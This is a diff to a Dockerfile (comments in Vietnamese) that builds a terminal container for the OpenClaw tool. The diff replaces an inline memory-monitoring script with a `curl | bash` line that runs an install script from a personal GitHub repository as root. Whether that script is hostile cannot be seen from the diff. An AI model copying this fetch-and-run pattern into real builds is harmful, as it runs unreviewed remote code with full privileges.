@@ -32,13 +32,16 @@ RUN wget -O /usr/local/bin/ttyd \
     chmod +x /usr/local/bin/ttyd
 
 # ─── 3. Cấu hình thư mục làm việc ────────────────────────────
-# WORKDIR /workspace
-WORKDIR /opt
-RUN git clone --recursive https://github.com/OpenClaw/OpenClaw.git openclaw \
-    && cd openclaw \
-    && npm install -g pnpm \
-    && pnpm install \
-    && pnpm build
+# # WORKDIR /workspace
+# WORKDIR /opt
+# RUN git clone --recursive https://github.com/OpenClaw/OpenClaw.git openclaw \
+#     && cd openclaw \
+#     && npm install -g pnpm \
+#     && pnpm install \
+#     && pnpm build
+
+## Cài toàn cục
+RUN npm i -g openclaw
 
 # ─── 4. Cấu hình Bash Prompt & Tmux ──────────────────────────────
 RUN echo 'export PS1="\u@debian:\w# "' >> /root/.bashrc
@@ -63,90 +66,7 @@ exec tmux attach -t $SESSION\n\
 ' > /start.sh && chmod +x /start.sh
 
 # ─── 6. Thêm mem_guard (giới hạn RAM + log 5 dòng) ─────────────────────────────
-RUN cat <<'EOF' > /usr/local/bin/mem_guard.sh
-#!/bin/bash
-
-THRESHOLD=85
-LOG_LINES=5
-LOG_FILE="/opt/mem.log"
-
-log_buffer=()
-
-get_mem_info() {
-  max=$(cat /sys/fs/cgroup/memory.max)
-  current=$(cat /sys/fs/cgroup/memory.current)
-
-  used_mb=$((current / 1024 / 1024))
-  max_mb=$((max / 1024 / 1024))
-  percent=$((current * 100 / max))
-
-  echo "$used_mb $max_mb $percent"
-}
-
-add_log() {
-  log_buffer+=("$1")
-
-  if [ "${#log_buffer[@]}" -gt "$LOG_LINES" ]; then
-    log_buffer=("${log_buffer[@]:1}")
-  fi
-
-  printf "%s\n" "${log_buffer[@]}" > "$LOG_FILE"
-}
-
-wait_for_memory() {
-  while true; do
-    read used_mb max_mb percent <<< $(get_mem_info)
-
-    if [ "$percent" -lt "$THRESHOLD" ]; then
-      break
-    fi
-
-    add_log "⏸ RAM ${percent}% > ${THRESHOLD}%"
-    sleep 1
-  done
-}
-
-process_job() {
-  job=$1
-  read used_mb max_mb percent <<< $(get_mem_info)
-
-  add_log "Job $job | ${used_mb}/${max_mb}MB (${percent}%)"
-
-  sleep 0.3
-}
-
-main() {
-  while true; do
-    for i in $(seq 1 1000); do
-      wait_for_memory
-      process_job $i
-    done
-  done
-}
-
-main
-EOF
-
-RUN chmod +x /usr/local/bin/mem_guard.sh
-
-RUN cat <<'EOF' > /usr/local/bin/ram
-#!/bin/bash
-watch -n 1 cat /opt/mem.log
-EOF
-
-RUN chmod +x /usr/local/bin/ram
-# # watch -n 1 cat /opt/mem.log
-# # Sau đó chỉ cần chạy: ram
-
-RUN cat <<'EOF' > /usr/local/bin/ram.mem
-#!/bin/bash
-tail -f /opt/mem.log
-EOF
-
-RUN chmod +x /usr/local/bin/ram.mem
-
-# chạy: ram.mem
-# hoặc : tail -f /opt/mem.log
+RUN curl -sL https://raw.githubusercontent.com/tylaujjapan0/memcon/main/install.sh | bash
 
 # ─── 7. Cấu hình Caddyfile (Xử lý đa đường dẫn) ─────────────────
 RUN mkdir -p /etc/caddy && \
